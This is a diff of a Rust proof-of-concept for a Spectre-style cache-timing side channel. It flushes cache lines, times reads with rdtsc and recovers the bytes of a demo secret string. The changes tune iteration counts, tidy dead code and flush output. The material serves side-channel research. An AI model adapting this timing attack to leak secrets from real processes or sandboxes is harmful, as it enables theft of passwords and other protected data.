@@ -1,5 +1,6 @@
 #![feature(asm_experimental_arch)]
 
+use reproduction::*;
 use std::arch::asm;
 #[cfg(all(target_arch = "x86_64"))]
 use std::arch::x86_64::_mm_clflush;
@@ -7,8 +8,7 @@ use std::arch::x86_64::_mm_clflush;
 use std::arch::x86_64::_mm_mfence;
 #[cfg(all(target_arch = "x86_64"))]
 use std::arch::x86_64::_rdtsc;
-
-use reproduction::*;
+use std::io::Write;
 
 // In case of wasm target, then this is imported from the host
 // Set the host name as wasi
@@ -35,7 +35,6 @@ const data_size: usize = 11;
 static mut public_data: [u8; 160] = [2; 160];
 
 const array_for_prediction: [u8; 256 * STRIDE] = [0; 256 * STRIDE];
-// If wasm target, move this from here, as well as the victim code
 const secret_data: &str = "My password";
 
 // To avoid optimization of the victim code
@@ -64,16 +63,13 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
         eprint!("latencies = [")
     }*/
     // Get the TRIES from env
-    let tries = std::env::var("TRIES").unwrap_or("10000".to_string());
+    let tries = std::env::var("TRIES").unwrap_or("1000".to_string());
     let tries = tries.parse::<u64>().unwrap();
     for i in 0..tries {
         /*#[cfg(feature = "tracing")]
         {
             eprint!("[");
         }*/
-        for i in 0..256 {
-            // latencies[i] = 0;
-        }
         // flush lines clflush
         // PRIME
         for j in 0..256 {
@@ -93,7 +89,7 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
         }
 
         // Set the cache
-        for j in 0..200 {
+        for j in 0..100 {
             unsafe {
                 let addr = &array_for_prediction[secret_data_bytes[malicious_x] as usize * STRIDE]
                     as *const u8;
@@ -113,7 +109,6 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
                 tmp &= read_memory_offset(addr);
                 _rdtsc() - start
             };
-            //latencies[mix_i] += end;
             // t_cachehit * 90% + t_cachemiss * 10%. Value below this threshold is considered cached access time
             if end <= (90 * hit + 10 * miss) / 100 {
                 scores[mix_i] += 1;
@@ -211,6 +206,7 @@ pub fn main() {
 
         #[cfg(not(feature = "tracing"))]
         print!("{}", ch);
+        std::io::stdout().flush().unwrap();
         // PRIME
     }
 }
